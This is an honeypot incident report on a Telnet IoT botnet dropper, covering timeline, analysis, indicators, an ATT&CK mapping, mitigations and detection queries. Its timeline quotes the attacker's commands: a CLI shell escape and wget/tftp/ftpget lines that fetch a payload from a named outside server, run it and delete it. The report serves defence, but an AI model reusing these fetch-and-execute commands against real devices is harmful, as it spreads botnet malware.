# IR-2026-002: Multi-Protocol IoT Botnet Dropper (payload server 185.93.89[.]72)

| Field | Value |
|---|---|
| **Incident ID** | IR-2026-002 |
| **Status** | Closed: monitored; payload delivery failed |
| **Severity** | Low on the honeypot (emulated shell, nothing executed, no payload received). **Critical** on a real device: this is the step where the device becomes a bot. |
| **Sensor** | `honeypot-01` (Cowrie, Telnet/23) |
| **First seen** | 2026-10-16 01:27:46 UTC |
| **Last seen** | 2026-10-16 13:46:40 UTC |
| **Sources** | `112.240.176[.]205`, `102.219.27[.]127`, `123.165.85[.]228` |
| **Payload server** | `185.93.89[.]72` (never connected to the sensor; referenced in commands only) |
| **Detection** | `cowrie_report.py` "Downloads" + "Most active sessions" (dl=6); campaign grouping by TTY hash |

## 1. Summary

Three hosts each logged in over **Telnet** with **`admin/admin`** and ran the same 32-command script. The script escaped a router CLI into a shell, checked the environment, found a writable directory, and then tried to **download and execute a malware payload** from `185.93.89[.]72`, falling back through **wget → tftp → ftpget**. It deleted each file right after running it.

The download failed every time. **TFTP and FTP were blocked by the sensor's outbound firewall** (only TCP 80/443 allowed), and the HTTP payload server didn't deliver. Identical step timings across all three hosts, hours apart, show they run the same loader code. No malware was captured; the only "downloaded" file was Cowrie's own error text.

## 2. Timeline (UTC): session `3d00f3315d7b`, `112.240.176[.]205`

| Time | Event |
|---|---|
| 01:27:46.638 | Telnet connection |
| 01:27:48.304 | **Login success `admin/admin`** |
| 01:27:48.917–.942 | `enable`, `system`, `shell`, `sh`, `linuxshell`, `enablelinuxshell`, `ping ;sh`: router CLI escape, ~3 ms apart |
| 01:27:48.942–50.734 | `busybox`, `cd /proc && cat self/cmdline`, `/bin/busybox`: environment checks |
| 01:27:51.506–.852 | `>/DIR/d && chmod 777 /DIR/d && /DIR/d && cd /DIR/` for 12 directories (`/tmp`, `/var`, `/var/tmp`, `/var/run`, `/dev`, `/dev/shm`, `/data`, `/etc`, `/mnt`, `/usr`, `/home`, `/root`) |
| 01:27:52.340 | `(wget http://185.93.89[.]72/wget -O- \|\| busybox wget …) > w; chmod 777 w; ./w; rm -rf w` |
| 01:28:02 / 01:28:12 | `file_download.failed` hxxp://185.93.89[.]72/wget (×2, 10 s timeouts) |
| 01:28:13.179 | `(tftp -g 185.93.89[.]72 -r tftp -l- \|\| busybox tftp …) > t; chmod 777 t; ./t; rm -rf t` |
| 01:28:28 / 01:28:43 | `file_download.failed` tftp[:]//185.93.89[.]72:69/tftp: **blocked by egress rules** |
| 01:28:44.573 | `(ftpget 185.93.89[.]72 f ftpget \|\| busybox ftpget …) > f; chmod 777 f; ./f; rm -rf f` |
| 01:28:49.474 | Cowrie saves redirected output `b9b17c4b…`: the text `tftp: TFTP: Transfer timed out` ×2 (**not a payload**) |
| 01:28:49.476 | Bot disconnects after 62.8 s |
| 01:29:14 | `file_download.failed` ftp[:]//185.93.89[.]72/ftpget: **blocked by egress rules** (Cowrie's fetch finished after the bot left) |

The same sequence ran from `102.219.27[.]127` (session `a6020bca53b2`, 11:18:52) and `123.165.85[.]228` (session `683adfe5d71c`, 13:45:28).

## 3. Analysis

**Same loader, three bots.** Evidence, strongest first:
1. **Identical step timings** in all three sessions: wget fail → +10 s → wget fail → +16 s → tftp fail → +15 s → tftp fail → +6 s → redirect saved → +25 s → ftp fail. Hard-coded timeouts in one program.
2. **Identical TTY recording hash** for two of the three sessions (`c45db736…`); the third (`fb562dc2…`) has the same commands and timings with a minor output difference.
3. Same credential, same 32 commands, same payload server and file names.

**Fallback chain.** IoT firmware ships with different subsets of BusyBox applets. Trying `wget`, then `tftp`, then `ftpget` (each with and without the `busybox` prefix) maximizes the chance that at least one transfer tool exists on the victim. The file names on the server (`/wget`, `tftp`, `ftpget`) suggest one payload per delivery method.

**Run and delete.** `./w; rm -rf w` executes the payload and immediately removes the file. The process keeps running from memory, and `/proc/PID/exe` then shows `(deleted)`. That's the exact property the competitor-killer script in Campaign D hunts for ([triage notes](notes/2026-10-16-triage.md)).

**Why nothing was delivered.**

| Channel | Outcome | Cause | Confidence |
|---|---|---|---|
| HTTP/80 | failed, 2 × 10 s | Egress allowed; the server didn't serve the file (offline or filtering) | Medium |
| TFTP/UDP 69 | timed out | **Blocked by the security group** (outbound 80/443 only) | High |
| FTP/21 | failed | **Blocked by the security group** | High |

**Control effectiveness:** the egress restriction designed in Phase 2 to stop a compromised host attacking others also cut two of three malware delivery paths. On a real network, the same rule (IoT devices may only reach what they need) would have reduced this to a single HTTP attempt.

**Sources are likely compromised devices.** Telnet-based scanning with default credentials and a fixed loader is typical of infected IoT nodes recruiting new victims. *Confidence: medium.* Confirm with ASN/reputation lookups.

**Payload server not reported to AbuseIPDB.** It never interacted with the sensor and no payload was received, so maliciousness is strongly suggested but not confirmed by our own evidence. It's recorded as an indicator; reputation lookups (AbuseIPDB/VirusTotal) should be checked before any further action.

## 4. Indicators

| Type | Indicator | Notes |
|---|---|---|
| IPv4 (payload server) | `185.93.89[.]72` | Referenced in commands; not observed connecting |
| URL | `hxxp://185.93.89[.]72/wget` | HTTP payload |
| URL | `tftp[:]//185.93.89[.]72:69/tftp` | TFTP payload |
| URL | `ftp[:]//185.93.89[.]72/ftpget` | FTP payload |
| IPv4 (source) | `112.240.176[.]205` | Session `3d00f3315d7b` |
| IPv4 (source) | `102.219.27[.]127` | Session `a6020bca53b2` |
| IPv4 (source) | `123.165.85[.]228` | Session `683adfe5d71c` |
| Credential | `admin` / `admin` | Default IoT credential |
| Command pattern | `(<tool> … 185.93.89[.]72 …) > X; chmod 777 X; ./X; rm -rf X` | Fetch-run-delete |
| Command pattern | `>/<dir>/d && chmod 777 /<dir>/d && /<dir>/d && cd /<dir>/` | Writable-dir probe (`d` variant; IR-2026-001 uses `.f`) |
| Session hash (internal) | `c45db7362f0972c10dfa121c9c07852683ef63465843c27a8938f7dfde6e2464` | Cowrie TTY log. Not a malware hash. |
| File hash (**benign**) | `b9b17c4bfb3a6a9057922c57a60a991b968692dd5e62f097409f63b9e81f2531` | Cowrie's emulated tftp error text. **Do not use as a malware IOC.** |

## 5. MITRE ATT&CK

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access | T1133 External Remote Services | Telnet login |
| Initial Access | T1078.001 Valid Accounts: Default Accounts | `admin/admin` |
| Execution | T1059.004 Unix Shell | CLI escape, `sh`, `./w` |
| Discovery | T1082 System Information Discovery | `cat /proc/self/cmdline`, `busybox` probe |
| Discovery | T1083 File and Directory Discovery | 12-directory writable/executable probe |
| Defense Evasion | T1222.002 Linux File Permissions Modification | `chmod 777` |
| Command and Control | **T1105 Ingress Tool Transfer** | wget / tftp / ftpget from `185.93.89[.]72` (attempted, failed) |
| Defense Evasion | **T1070.004 Indicator Removal: File Deletion** | `rm -rf w` after execution |

## 6. Recommended actions

*As they would apply to a real network.*

1. **Egress filtering for IoT/OT segments:** allow only required destinations; in particular block outbound **TFTP (UDP 69)** and **FTP (21)**, which legitimate IoT devices rarely need to the internet. This control demonstrably blocked two of three delivery paths here.
2. **Block `185.93.89[.]72`** at the perimeter and **alert** on any internal host contacting it. Payload servers change less often than the bots that point at them, so this indicator is more durable than the source IPs.
3. **Disable Telnet; remove default credentials** (see IR-2026-001).
4. **Hunt** on managed Linux/IoT hosts for processes whose executable is `(deleted)`, and for short single-letter files (`w`, `t`, `f`, `d`) in `/tmp`, `/var`, `/dev/shm`.
5. **Honeypot decision (Phase 7):** capturing payloads would mean letting Cowrie fetch over TFTP/FTP. That's Cowrie downloading, not executing, but it means the sensor contacting malware infrastructure on more ports. Keep blocked for now; revisit with destination-restricted rules if sample capture becomes a goal.

## 7. Detection queries (Grafana / LogQL)

```logql
# Any download attempt referencing this payload server
{job="cowrie", eventid=~"cowrie.session.file_download.*"} | json | url=~".*185\\.93\\.89\\.72.*"

# Fetch-run-delete pattern, any server
{job="cowrie", eventid="cowrie.command.input"} | json
  | input=~".*(wget|tftp|ftpget).*> ?[a-z]+; ?chmod 777 [a-z]+; ?\\./[a-z]+; ?rm -rf [a-z]+.*"

# Failed downloads by URL (egress blocks or dead servers)
sum by (url) (count_over_time({job="cowrie", eventid="cowrie.session.file_download.failed"} | json [24h]))
```
